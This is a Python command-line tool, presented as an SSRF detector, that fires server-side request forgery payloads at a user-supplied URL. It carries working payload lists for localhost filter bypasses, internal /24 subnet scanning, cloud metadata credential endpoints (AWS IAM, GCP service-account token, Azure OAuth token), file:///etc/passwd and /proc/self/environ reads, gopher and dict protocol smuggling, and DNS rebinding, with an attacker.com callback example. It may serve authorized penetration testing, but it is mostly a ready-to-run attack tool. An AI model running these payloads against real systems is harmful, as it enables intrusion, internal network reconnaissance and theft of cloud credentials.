#!/usr/bin/env python3
"""
SSRF Detector
Server-Side Request Forgery vulnerability scanner
"""

import requests
import re
import time
from urllib.parse import urlparse, urljoin, quote
import threading
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def run():
    print("\033[92m" + "="*70)
    print("           SSRF DETECTOR")
    print("="*70 + "\033[0m\n")
    
    print("\033[93m[!] WARNING: Only test on authorized targets!\033[0m\n")
    
    print("\033[97mChoose Test Type:\033[0m")
    print("  [1] Basic SSRF Detection")
    print("  [2] Internal Network Scan (via SSRF)")
    print("  [3] Cloud Metadata Exploitation")
    print("  [4] Protocol Smuggling (file://, gopher://, dict://)")
    print("  [5] DNS Rebinding Test")
    print("  [6] Automated SSRF Scanner")
    
    choice = input("\n\033[95m[?] Select option: \033[0m").strip()
    
    if choice == '1':
        basic_ssrf_test()
    elif choice == '2':
        internal_network_scan()
    elif choice == '3':
        cloud_metadata_test()
    elif choice == '4':
        protocol_smuggling()
    elif choice == '5':
        dns_rebinding_test()
    elif choice == '6':
        automated_scanner()
    else:
        print("\033[91m[!] Invalid choice.\033[0m")

def basic_ssrf_test():
    """Basic SSRF vulnerability testing"""
    print("\n\033[92m[*] Basic SSRF Detection\033[0m\n")
    
    target_url = input("\033[97m[?] Target URL with parameter (e.g., http://site.com/fetch?url=): \033[0m").strip()
    if not target_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    print("\033[97m[?] Your external IP or callback server URL: \033[0m")
    callback = input("    (e.g., http://attacker.com or use burpcollaborator.net): ").strip()
    
    if not callback:
        print("\033[93m[*] No callback provided. Using localhost tests only.\033[0m")
        callback = "http://127.0.0.1"
    
    # SSRF test payloads
    SSRF_PAYLOADS = [
        # Localhost variations
        'http://localhost',
        'http://127.0.0.1',
        'http://127.1',
        'http://0.0.0.0',
        'http://0',
        'http://[::1]',
        'http://127.0.0.1:80',
        'http://127.0.0.1:22',
        'http://127.0.0.1:3306',
        'http://127.0.0.1:6379',
        
        # Localhost bypass techniques
        'http://127.0.0.1.nip.io',
        'http://127.0.0.1.xip.io',
        'http://127.0.0.1.localtest.me',
        'http://localhost.localtest.me',
        
        # URL encoding bypass
        'http://127.0.0.1',
        'http://127.0.0.%31',
        'http://127.0.%30.1',
        'http://127.%30.0.1',
        
        # Decimal/Octal/Hex encoding
        'http://2130706433',  # 127.0.0.1 in decimal
        'http://0x7f000001',  # 127.0.0.1 in hex
        'http://017700000001',  # 127.0.0.1 in octal
        
        # Alternative schemas
        'http://127.0.0.1/',
        'https://127.0.0.1/',
        
        # Callback test
        callback,
        callback + '/ssrf-test',
    ]
    
    print(f"\n\033[97m[*] Testing {len(SSRF_PAYLOADS)} SSRF payloads...\033[0m\n")
    
    vulnerabilities = []
    
    for payload in SSRF_PAYLOADS:
        try:
            test_url = target_url + quote(payload, safe=':/')
            
            print(f"\033[90m[*] Testing: {payload}\033[0m")
            
            response = requests.get(test_url, timeout=10, verify=False)
            
            # Check for successful SSRF
            if is_ssrf_successful(response, payload):
                print(f"\033[92m[+] SSRF FOUND: {payload}\033[0m")
                vulnerabilities.append({
                    'payload': payload,
                    'url': test_url,
                    'status': response.status_code,
                    'length': len(response.content),
                    'response': response.text[:200]
                })
            
        except requests.Timeout:
            print(f"\033[93m[!] Timeout: {payload}\033[0m")
        except Exception as e:
            print(f"\033[91m[!] Error: {payload} - {str(e)[:50]}\033[0m")
    
    # Results
    print("\n" + "="*70)
    
    if vulnerabilities:
        print(f"\033[92m[+] Found {len(vulnerabilities)} potential SSRF vulnerabilities!\033[0m\n")
        
        for vuln in vulnerabilities:
            print(f"\033[93mPayload: {vuln['payload']}\033[0m")
            print(f"  Status: {vuln['status']}")
            print(f"  Response Length: {vuln['length']} bytes")
            print(f"  Preview: {vuln['response'][:100]}...")
            print()
        
        save_results(vulnerabilities, "ssrf_basic_results.txt")
    else:
        print(f"\033[93m[!] No SSRF vulnerabilities found.\033[0m")

def internal_network_scan():
    """Scan internal network via SSRF"""
    print("\n\033[92m[*] Internal Network Scanner (via SSRF)\033[0m\n")
    
    target_url = input("\033[97m[?] SSRF-vulnerable URL with parameter: \033[0m").strip()
    if not target_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    network = input("\033[97m[?] Internal network to scan (e.g., 192.168.1): \033[0m").strip() or "192.168.1"
    port = input("\033[97m[?] Port to scan (default 80): \033[0m").strip() or "80"
    
    print(f"\n\033[97m[*] Scanning {network}.0/24 on port {port}...\033[0m\n")
    
    live_hosts = []
    
    for i in range(1, 255):
        ip = f"{network}.{i}"
        payload = f"http://{ip}:{port}"
        
        try:
            test_url = target_url + quote(payload, safe=':/')
            
            response = requests.get(test_url, timeout=3, verify=False)
            
            # Check if host responded
            if response.status_code != 500 and len(response.content) > 0:
                print(f"\033[92m[+] LIVE: {ip}:{port}\033[0m")
                live_hosts.append({
                    'ip': ip,
                    'port': port,
                    'status': response.status_code,
                    'length': len(response.content)
                })
            else:
                print(f"\033[90m[-] Dead: {ip}\033[0m")
        
        except:
            print(f"\033[90m[-] Dead: {ip}\033[0m")
    
    # Results
    if live_hosts:
        print(f"\n\033[92m[+] Found {len(live_hosts)} live hosts!\033[0m\n")
        
        for host in live_hosts:
            print(f"  {host['ip']}:{host['port']} - Status: {host['status']}, Size: {host['length']} bytes")
        
        save_results(live_hosts, "ssrf_internal_scan.txt")
    else:
        print(f"\n\033[93m[!] No live hosts found.\033[0m")

def cloud_metadata_test():
    """Test cloud metadata service access via SSRF"""
    print("\n\033[92m[*] Cloud Metadata Exploitation\033[0m\n")
    
    target_url = input("\033[97m[?] SSRF-vulnerable URL: \033[0m").strip()
    if not target_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    # Cloud metadata endpoints
    CLOUD_METADATA = {
        'AWS': [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
        ],
        'Google Cloud': [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/',
            'http://metadata.google.internal/computeMetadata/v1/project/',
            'http://metadata/computeMetadata/v1/instance/service-accounts/default/token',
        ],
        'Azure': [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        ],
        'Digital Ocean': [
            'http://169.254.169.254/metadata/v1/',
            'http://169.254.169.254/metadata/v1/id',
            'http://169.254.169.254/metadata/v1/user-data',
        ],
        'Oracle Cloud': [
            'http://169.254.169.254/opc/v1/instance/',
        ],
    }
    
    print(f"\n\033[97m[*] Testing cloud metadata endpoints...\033[0m\n")
    
    findings = []
    
    for provider, endpoints in CLOUD_METADATA.items():
        print(f"\033[93m[*] Testing {provider}...\033[0m")
        
        for endpoint in endpoints:
            try:
                test_url = target_url + quote(endpoint, safe=':/')
                
                response = requests.get(test_url, timeout=10, verify=False)
                
                # Check for successful metadata access
                if response.status_code == 200 and len(response.content) > 0:
                    # Check for cloud-specific indicators
                    indicators = ['ami-', 'instance', 'token', 'credential', 'key', 'secret']
                    
                    if any(ind in response.text.lower() for ind in indicators):
                        print(f"\033[92m[+] ACCESSIBLE: {endpoint}\033[0m")
                        findings.append({
                            'provider': provider,
                            'endpoint': endpoint,
                            'response': response.text[:500]
                        })
                
            except Exception as e:
                pass
    
    print()
    
    # Results
    if findings:
        print(f"\033[92m[+] Found {len(findings)} accessible metadata endpoints!\033[0m\n")
        
        for finding in findings:
            print(f"\033[93mProvider: {finding['provider']}\033[0m")
            print(f"Endpoint: {finding['endpoint']}")
            print(f"Response:\n{finding['response'][:200]}...\n")
        
        save_results(findings, "ssrf_cloud_metadata.txt")
    else:
        print(f"\033[93m[!] No metadata endpoints accessible.\033[0m")

def protocol_smuggling():
    """Test protocol smuggling via SSRF"""
    print("\n\033[92m[*] Protocol Smuggling Test\033[0m\n")
    
    target_url = input("\033[97m[?] SSRF-vulnerable URL: \033[0m").strip()
    if not target_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    # Protocol smuggling payloads
    PROTOCOL_PAYLOADS = {
        'File Protocol': [
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            'file://localhost/etc/passwd',
            'file:///proc/self/environ',
        ],
        'Gopher Protocol': [
            'gopher://127.0.0.1:80/_GET / HTTP/1.0%0d%0a%0d%0a',
            'gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com',
        ],
        'Dict Protocol': [
            'dict://127.0.0.1:11211/stats',
            'dict://127.0.0.1:6379/info',
        ],
        'LDAP Protocol': [
            'ldap://127.0.0.1:389/dc=example,dc=com',
        ],
        'FTP Protocol': [
            'ftp://127.0.0.1/',
            'ftp://anonymous:anonymous@127.0.0.1/',
        ],
    }
    
    print(f"\n\033[97m[*] Testing protocol smuggling...\033[0m\n")
    
    vulnerabilities = []
    
    for protocol, payloads in PROTOCOL_PAYLOADS.items():
        print(f"\033[93m[*] Testing {protocol}...\033[0m")
        
        for payload in payloads:
            try:
                test_url = target_url + quote(payload, safe=':/')
                
                response = requests.get(test_url, timeout=10, verify=False)
                
                if len(response.content) > 0 and 'error' not in response.text.lower():
                    print(f"\033[92m[+] WORKS: {payload}\033[0m")
                    vulnerabilities.append({
                        'protocol': protocol,
                        'payload': payload,
                        'response': response.text[:200]
                    })
                
            except Exception as e:
                pass
    
    print()
    
    if vulnerabilities:
        print(f"\033[92m[+] Found {len(vulnerabilities)} working protocols!\033[0m\n")
        
        for vuln in vulnerabilities:
            print(f"\033[93m{vuln['protocol']}: {vuln['payload']}\033[0m")
            print(f"  Response: {vuln['response'][:100]}...\n")
        
        save_results(vulnerabilities, "ssrf_protocol_smuggling.txt")
    else:
        print(f"\033[93m[!] No protocol smuggling vulnerabilities found.\033[0m")

def dns_rebinding_test():
    """Test DNS rebinding attack"""
    print("\n\033[92m[*] DNS Rebinding Test\033[0m\n")
    print("\033[97m[*] This requires a DNS rebinding service like rebind.network or rbndr.us\033[0m\n")
    
    target_url = input("\033[97m[?] SSRF-vulnerable URL: \033[0m").strip()
    if not target_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    internal_ip = input("\033[97m[?] Internal IP to target: \033[0m").strip() or "127.0.0.1"
    
    # DNS rebinding services
    rebinding_domains = [
        f'{internal_ip}.rebind.network',
        f'{internal_ip}.rbndr.us',
        f'a.{internal_ip}.1time.1u.ms',
    ]
    
    print(f"\n\033[97m[*] Testing DNS rebinding...\033[0m\n")
    
    for domain in rebinding_domains:
        payload = f'http://{domain}/'
        
        try:
            test_url = target_url + quote(payload, safe=':/')
            
            print(f"\033[93m[*] Testing: {domain}\033[0m")
            
            # Make multiple requests to trigger rebinding
            for i in range(3):
                response = requests.get(test_url, timeout=10, verify=False)
                
                if len(response.content) > 0:
                    print(f"\033[92m[+] Response {i+1}: {len(response.content)} bytes\033[0m")
                
                time.sleep(2)
        
        except Exception as e:
            print(f"\033[91m[!] Error: {str(e)}\033[0m")

def automated_scanner():
    """Automated SSRF scanner"""
    print("\n\033[92m[*] Automated SSRF Scanner\033[0m\n")
    
    target_url = input("\033[97m[?] Target URL: \033[0m").strip()
    if not target_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    # Parse URL to find parameters
    from urllib.parse import urlparse, parse_qs
    
    parsed = urlparse(target_url)
    params = parse_qs(parsed.query)
    
    if not params:
        print("\033[91m[!] No parameters found in URL.\033[0m")
        return
    
    print(f"\033[97m[*] Found parameters: {', '.join(params.keys())}\033[0m\n")
    
    # Combined payloads
    ALL_PAYLOADS = [
        'http://127.0.0.1',
        'http://localhost',
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'file:///etc/passwd',
        'http://127.1',
        'http://0.0.0.0',
    ]
    
    vulnerabilities = []
    
    # Test each parameter
    for param_name in params.keys():
        print(f"\033[93m[*] Testing parameter: {param_name}\033[0m\n")
        
        for payload in ALL_PAYLOADS:
            try:
                # Replace parameter value
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                from urllib.parse import urlencode
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                
                response = requests.get(test_url, timeout=5, verify=False)
                
                if is_ssrf_successful(response, payload):
                    print(f"\033[92m[+] SSRF: {param_name} with {payload}\033[0m")
                    vulnerabilities.append({
                        'parameter': param_name,
                        'payload': payload,
                        'url': test_url
                    })
            
            except:
                pass
    
    # Results
    if vulnerabilities:
        print(f"\n\033[92m[+] Found {len(vulnerabilities)} SSRF vulnerabilities!\033[0m\n")
        
        for vuln in vulnerabilities:
            print(f"\033[93mParameter: {vuln['parameter']}\033[0m")
            print(f"Payload: {vuln['payload']}\n")
        
        save_results(vulnerabilities, "ssrf_scan_results.txt")
    else:
        print(f"\n\033[93m[!] No SSRF vulnerabilities found.\033[0m")

def is_ssrf_successful(response, payload):
    """Check if SSRF was successful"""
    # Check for common success indicators
    success_indicators = [
        'root:x:', 'daemon:', '/bin/bash',  # /etc/passwd
        'ami-', 'instance', 'iam/security-credentials',  # AWS metadata
        'uid=', 'gid=',  # Command output
        '[extensions]', '[fonts]',  # Windows win.ini
    ]
    
    # Check status code
    if response.status_code == 200:
        # Check response content
        for indicator in success_indicators:
            if indicator in response.text:
                return True
        
        # Check if response is not empty and not an error
        if len(response.content) > 100 and 'error' not in response.text.lower():
            return True
    
    return False

def save_results(results, filename):
    """Save results to file"""
    try:
        with open(filename, 'w') as f:
            f.write("SSRF Detection Results\n")
            f.write("="*70 + "\n\n")
            
            for result in results:
                for key, value in result.items():
                    f.write(f"{key}: {value}\n")
                f.write("\n")
        
        print(f"\033[92m[*] Results saved to {filename}\033[0m")
    except Exception as e:
        print(f"\033[91m[!] Error saving: {str(e)}\033[0m")

if __name__ == "__main__":
    run()
